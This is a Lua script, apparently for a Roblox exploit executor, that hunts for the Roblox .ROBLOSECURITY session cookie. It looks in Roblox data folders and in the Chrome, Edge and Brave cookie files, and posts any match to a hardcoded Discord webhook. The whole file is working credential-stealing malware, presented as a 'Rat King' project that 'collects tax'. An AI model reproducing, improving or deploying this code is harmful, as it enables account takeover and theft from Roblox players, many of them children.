--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ЧИСТЫЙ LUA
    Архитектор: Твой злой гений
    Метод: Только io.open + HTTP. Никаких внешних процессов.
]========================================================]

local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"
local httpService = game:GetService("HttpService")

-- Простая функция отправки в Discord
local function send(cookie, source)
    local payload = httpService:JSONEncode({
        embeds = {{
            title = "🚬 НАЛОГ СОБРАН",
            color = 0x8B0000,
            fields = {
                {name = "Кука", value = "```" .. cookie:sub(1, 1000) .. "```", inline = false},
                {name = "Источник", value = "```" .. source .. "```", inline = false}
            }
        }}
    })
    
    if syn and syn.request then
        syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
    else
        httpService:PostAsync(webhook, payload)
    end
end

-- Функция поиска кук в папках Roblox (LocalStorage)
local function scanRobloxFolders()
    local basePaths = {
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox",
        os.getenv("LOCALAPPDATA") .. "\\Roblox",
        os.getenv("APPDATA") .. "\\Roblox"
    }
    
    local searchFolders = {"LocalStorage", "Cookies", "settings", ""}
    
    for _, base in ipairs(basePaths) do
        for _, folder in ipairs(searchFolders) do
            local path = folder ~= "" and (base .. "\\" .. folder) or base
            
            -- Пытаемся открыть папку как файл (не сработает, но мы хотя бы проверим существование)
            local function listFiles(dir)
                -- В Lua без io.popen нельзя получить список файлов.
                -- Но мы можем попробовать открыть известные имена файлов.
                -- Roblox хранит данные в файлах с именами, которые содержат "http"
                local knownPatterns = {"https", "roblox", "cookie", "local", "storage", ".ROBLOSECURITY"}
                local results = {}
                
                for _, pattern in ipairs(knownPatterns) do
                    local testFile = io.open(dir .. "\\" .. pattern, "r")
                    if testFile then
                        table.insert(results, dir .. "\\" .. pattern)
                        testFile:close()
                    end
                end
                
                return results
            end
            
            local files = listFiles(path)
            for _, filePath in ipairs(files) do
                local f = io.open(filePath, "rb")
                if f then
                    local raw = f:read("*a")
                    f:close()
                    
                    if raw and #raw > 20 then
                        -- Ищем любые данные, похожие на куку Roblox
                        local patterns = {
                            ".ROBLOSECURITY=([%w_%-%.]+)",
                            "Cookie:%s*([%w_%-%.]+)",
                            "roblox%.com\t([%w_%-%.]+)",
                            "_%|WARNING:-DO-NOT-SHARE-THIS%|%|_([%w_%-]+)"
                        }
                        
                        for _, pat in ipairs(patterns) do
                            local match = raw:match(pat)
                            if match and #match > 20 and #match < 1000 then
                                send(match, "RobloxLocalStorage: " .. filePath)
                                return -- Нашли одну — хватит
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Функция поиска в Chrome Cookies (прямое чтение SQLite без внешних программ)
local function scanChromeCookies()
    local paths = {
        {"Chrome", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"},
        {"Edge", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"},
        {"Brave", os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"}
    }
    
    for _, browser in ipairs(paths) do
        local f = io.open(browser[2], "rb")
        if f then
            local raw = f:read("*a")
            f:close()
            
            if raw and #raw > 0 then
                -- Ищем .ROBLOSECURITY в сырых данных SQLite
                local pos = 0
                while true do
                    pos = raw:find(".ROBLOSECURITY", pos + 1, true)
                    if not pos then break end
                    
                    -- В SQLite данные хранятся рядом с именем поля
                    -- Ищем любое значение длиной > 20 символов рядом с именем
                    local chunk = raw:sub(pos, pos + 2000)
                    
                    -- Пытаемся найти текст, который выглядит как кука
                    -- Кука Roblox обычно длинная и содержит _|WARNING
                    local match = chunk:match("_%|WARNING.*%|_([%w]+)")
                    if not match then
                        match = chunk:match("([%w_]{50,})")
                    end
                    
                    if match and #match > 30 then
                        send(match, browser[1] .. " SQLite")
                        return
                    end
                end
            end
        end
    end
end

-- Запуск
scanRobloxFolders()
scanChromeCookies()
